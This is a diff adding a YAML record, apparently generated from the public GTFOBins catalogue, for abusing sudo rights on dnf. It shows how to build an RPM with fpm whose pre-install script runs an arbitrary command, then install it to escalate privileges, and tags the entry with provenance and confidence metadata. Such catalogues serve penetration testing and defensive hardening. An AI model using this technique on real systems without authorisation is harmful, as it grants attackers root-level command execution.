@@ -1,0 +1,104 @@
+id: gtfobins/dnf/command/sudo
+type: binary
+platform: linux
+name: dnf
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
+  comment: 'Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to
+    the target.
+
+
+    ```
+
+    echo /path/to/command >x.sh
+
+    fpm -n x -s dir -t rpm -a all --before-install x.sh .
+
+    ```
+
+
+    The `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise.'
+references:
+- https://gtfobins.github.io/gtfobins/dnf/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        dnf:
+          functions:
+            command:
+            - code: dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
+              comment: 'Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload
+                it to the target.
+
+
+                ```
+
+                echo /path/to/command >x.sh
+
+                fpm -n x -s dir -t rpm -a all --before-install x.sh .
+
+                ```
+
+
+                The `--disablerepo=*` option is used for targets without Internet connectivity, can be
+                omitted otherwise.'
+              contexts:
+                sudo: null
+    upstream_url: https://gtfobins.github.io/gtfobins/dnf/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:5d294b7fa12b7d85672c37a485f61394fdbd68ffdb183e40166f87ce0587ad39
